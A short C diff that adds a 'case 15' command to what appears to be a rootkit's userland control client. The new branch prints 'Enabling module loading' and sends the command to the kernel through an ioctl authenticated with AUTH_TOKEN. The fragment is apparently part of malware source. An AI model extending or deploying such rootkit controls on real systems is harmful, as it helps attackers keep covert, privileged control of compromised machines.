@@ -237,6 +237,12 @@ int main ( int argc, char *argv[] )
             io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
             break;
 
+        case 15:
+            printf("Enabling module loading\n");
+            rk_args.cmd = 15;
+            io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
+            break;
+
         case 100:
             {
                 printf("Null command\n");
